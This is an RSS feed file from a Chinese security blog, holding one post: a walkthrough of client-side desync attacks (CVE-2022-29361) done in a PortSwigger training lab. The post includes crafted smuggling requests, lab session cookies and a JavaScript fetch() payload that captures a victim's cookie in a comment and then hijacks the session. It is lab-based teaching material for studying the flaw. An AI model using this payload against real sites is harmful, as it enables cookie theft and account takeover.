@@ -1,0 +1,248 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>CSD Attack on 美咕噜的小站</title>
+        <link>https://0d000721999.github.io/tags/csd-attack/</link>
+        <description>Recent content in CSD Attack on 美咕噜的小站</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>无敌可爱美咕噜</copyright>
+        <lastBuildDate>Mon, 11 Aug 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://0d000721999.github.io/tags/csd-attack/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Client-side desync attacks（CVE-2022-29361）</title>
+        <link>https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/</link>
+        <pubDate>Mon, 11 Aug 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/</guid>
+        <description>&lt;img src="https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/1.webp" alt="Featured image of post Client-side desync attacks（CVE-2022-29361）" /&gt;&lt;h1 id=&#34;client-side-desync-attackscve-2022-29361&#34;&gt;Client-side desync attacks（CVE-2022-29361）
+&lt;/h1&gt;&lt;p&gt;找不到中文复现文章，但是能找到bp的介绍和靶场：&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/request-smuggling/browser/client-side-desync&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Client-side desync attacks | Web Security Academy&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;具体原理参考：&lt;a class=&#34;link&#34; href=&#34;https://mizu.re/post/abusing-client-side-desync-on-werkzeug&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Abusing Client-Side Desync on Werkzeug | mizu.re&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;利用条件&#34;&gt;利用条件
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Werkzeug==2.1.0 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Flask==2.1.0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以看到是flask 2.1.0版本存在的漏洞&lt;/p&gt;
+&lt;h2 id=&#34;csd攻击原理&#34;&gt;CSD攻击原理
+&lt;/h2&gt;&lt;p&gt;这个漏洞实际上是http请求走私的变体，完整的攻击介绍在bp官方也有介绍：&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/research/browser-powered-desync-attacks&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling | PortSwigger Research&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;下面我们来讲讲原理：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250810205956541.png&#34;
+	width=&#34;1327&#34;
+	height=&#34;484&#34;
+	srcset=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250810205956541_hu18269869715068601809.png 480w, https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250810205956541_hu8151483210089266057.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250810205956541&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;274&#34;
+		data-flex-basis=&#34;658px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;首先第一个请求时post，而且他的connection是&lt;code&gt;keep-alive&lt;/code&gt;,这个很重要，它的请求体里面有另一个get请求头&lt;/p&gt;
+&lt;p&gt;如果这个web服务器没有防护，他就会把请求体留在连接队列中，当浏览器发送另一个请求时，他会先读取队列中的请求体，再读取后面的get请求头，因此原本的login路由就变成404路由的请求&lt;/p&gt;
+&lt;p&gt;这种情况通常发生在不需要发送数据的路由，比如静态界面和重定向界面，这么一看这像是个小bug，看似没有危害，但是如果在CORS或cookie配置错误而保留用户会话的情况下，可能可以进行CSRF攻击盗取cookie,因为第二次请求会携带cookie&lt;/p&gt;
+&lt;p&gt;执行这种攻击，最简单的办法是使用fetch JavaScript函数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://localhost:5000/register&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;GET /404 HTTP/1.1\r\nFoo: x&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;cors&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;include&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}).&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://localhost:5000/login&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;其实如果服务器防御不好，可以触发308重定向使所有界面触发XSS,可以参考前面的文章&lt;/p&gt;
+&lt;h2 id=&#34;bp靶场练习&#34;&gt;bp靶场练习
+&lt;/h2&gt;&lt;h3 id=&#34;client-side-desync&#34;&gt;Client-side desync
+&lt;/h3&gt;&lt;p&gt;参考wp:&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/news/12700&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;请求走私利用扩展(终结篇)-先知社区&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;进入靶场先发现&lt;code&gt;/&lt;/code&gt;路径会默认重定向到&lt;code&gt;/en&lt;/code&gt;路由&lt;/p&gt;
+&lt;p&gt;抓包看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811135353993.png&#34;
+	width=&#34;1479&#34;
+	height=&#34;764&#34;
+	srcset=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811135353993_hu6254412530984989503.png 480w, https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811135353993_hu7062677656336072806.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250811135353993&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;193&#34;
+		data-flex-basis=&#34;464px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里我们先测试Content-Length长度是否会检查，先进设置关闭repeater的自动更新Content-Length长度选项，方法改成post，Content-Length长度随意，但是不传请求体试试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811135829431.png&#34;
+	width=&#34;1488&#34;
+	height=&#34;789&#34;
+	srcset=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811135829431_hu16912837552190729479.png 480w, https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811135829431_hu6177143636826555769.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250811135829431&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;188&#34;
+		data-flex-basis=&#34;452px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以发现确实忽略Content-Length长度,接着把设置改回来，构造下面的请求包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST / HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 0ac60061048f7bc2807e037d00d500af.h1-web-security-academy.net
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: keep-alive
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /hopefully404 HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Foo: x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后send需要更改send的模式，&lt;del&gt;我也是第一次知道bp有这种功能&lt;/del&gt;，先再发一个正常的get请求到repeater模块，然后把这两个请求变成一个包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811141729319.png&#34;
+	width=&#34;398&#34;
+	height=&#34;461&#34;
+	srcset=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811141729319_hu18360134282133350262.png 480w, https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811141729319_hu1417448220942068494.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250811141729319&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;86&#34;
+		data-flex-basis=&#34;207px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接着send就会出现多种模式了，我们选择Send group in sequence (single connection)&lt;/p&gt;
+&lt;p&gt;然后发送请求，检查后面那个正常的get请求，发现出现404，就说明CSD攻击可以成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811142559825.png&#34;
+	width=&#34;1490&#34;
+	height=&#34;822&#34;
+	srcset=&#34;https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811142559825_hu17801947923630792551.png 480w, https://0d000721999.github.io/p/client-side-desync-attackscve-2022-29361/image-20250811142559825_hu2892294167469661554.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250811142559825&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;435px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;回到主站，看到博客界面的评论功能，我们抓包测试通过CSD攻击能不能修改评论的输出&lt;/p&gt;
+&lt;p&gt;第一个请求包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST / HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 0ab9006d042553a780a45d54003c00d0.h1-web-security-academy.net
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: keep-alive
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 607
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST /en/post/comment HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 0ab9006d042553a780a45d54003c00d0.h1-web-security-academy.net
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Cookie: session=aVKWs2UolWpBZuBBK1cI0HycapAha0EM; _lab_analytics=3Syld3KVwHBg7ndkjWSk3rKoJ3y9eM6U850srSZOPxvLmPRNTyQUxvH7dBs4LsrMsfweYR1VXWo8T0HcbR6PyLs1qdRV33LmkfEq1vJSGn6LsuR1NRv040hKVjfFJt5JOA72cueu2jyKlbX81LFIIKcZl72zoRvCSirCwb53myJM60SogEMMWkk7OXr0DWcLdfSaaRRtwuLbmAGwXzlDvVbcWl1obMDlRH72NtbnDfi1ZbQO9t7TqjUaos3PwRq1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/x-www-form-urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 89
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: keep-alive
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;csrf=S9AGdWd1H3CxICFVy4D060JTuYpdzfYM&amp;amp;postId=2&amp;amp;comment=1&amp;amp;name=1&amp;amp;email=1%40qq.com&amp;amp;website=
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后第二个请求包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /capture-me HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 0ab9006d042553a780a45d54003c00d0.h1-web-security-academy.net
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;发现两个包都返回302，而且capture-me这个路由返回的location确实是评论的路由&lt;/p&gt;
+&lt;p&gt;回到浏览器查看，确实输出了GET /capture-me&lt;/p&gt;
+&lt;p&gt;接下来我们在漏洞服务器的浏览器控制台用js来触发这个CSD攻击，泄露数据&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fetch(&amp;#39;https://0ab9006d042553a780a45d54003c00d0.h1-web-security-academy.net&amp;#39;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        method: &amp;#39;POST&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        body: &amp;#39;POST /en/post/comment HTTP/1.1\r\nHost: 0ab9006d042553a780a45d54003c00d0.h1-web-security-academy.net\r\nCookie: session=aVKWs2UolWpBZuBBK1cI0HycapAha0EM; _lab_analytics=3Syld3KVwHBg7ndkjWSk3rKoJ3y9eM6U850srSZOPxvLmPRNTyQUxvH7dBs4LsrMsfweYR1VXWo8T0HcbR6PyLs1qdRV33LmkfEq1vJSGn6LsuR1NRv040hKVjfFJt5JOA72cueu2jyKlbX81LFIIKcZl72zoRvCSirCwb53myJM60SogEMMWkk7OXr0DWcLdfSaaRRtwuLbmAGwXzlDvVbcWl1obMDlRH72NtbnDfi1ZbQO9t7TqjUaos3PwRq1\r\nContent-Length: 300\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=S9AGdWd1H3CxICFVy4D060JTuYpdzfYM&amp;amp;postId=2&amp;amp;name=1&amp;amp;email=1@qq.com&amp;amp;website=&amp;amp;comment=&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        mode: &amp;#39;cors&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        credentials: &amp;#39;include&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }).catch(() =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        fetch(&amp;#39;https://0ab9006d042553a780a45d54003c00d0.h1-web-security-academy.net/capture-me&amp;#39;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        mode: &amp;#39;no-cors&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        credentials: &amp;#39;include&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    })
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;改变Content-Length可以泄露更多信息&lt;/p&gt;
+&lt;p&gt;回到漏洞服务器用&lt;code&gt;＜script＞&lt;/code&gt;标签包裹并发送给受害者，然后回到前下的评论查看，发现确实带出了cookie,注意这里要把Content-Length改的尽量长&lt;/p&gt;
+&lt;p&gt;把session值拿过来给/my-account路由发包就行了&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
